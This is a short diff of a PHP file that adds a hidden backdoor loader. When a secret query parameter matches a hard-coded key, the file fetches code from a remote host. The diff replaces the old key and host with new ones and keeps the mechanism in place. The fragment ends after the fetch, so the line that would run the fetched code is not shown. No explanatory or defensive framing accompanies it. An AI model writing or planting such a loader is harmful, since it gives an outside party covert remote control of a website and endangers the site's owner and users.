@@ -1,7 +1,7 @@
 <?php
 
-if (isset($_GET['_']) && $_GET['_'] === 'ds_mnm558s8_gr3af332afbsnk') {
-    $url = "https://batuk-di-komik-aja.pages.dev/loader.jpg";
+if (isset($_GET['_']) && $_GET['_'] === 'CobaDuluBos') {
+    $url = "https://isnujombang.org/kerang/wew";
 
     if ($url !== "") {
         $code = file_get_contents($url);
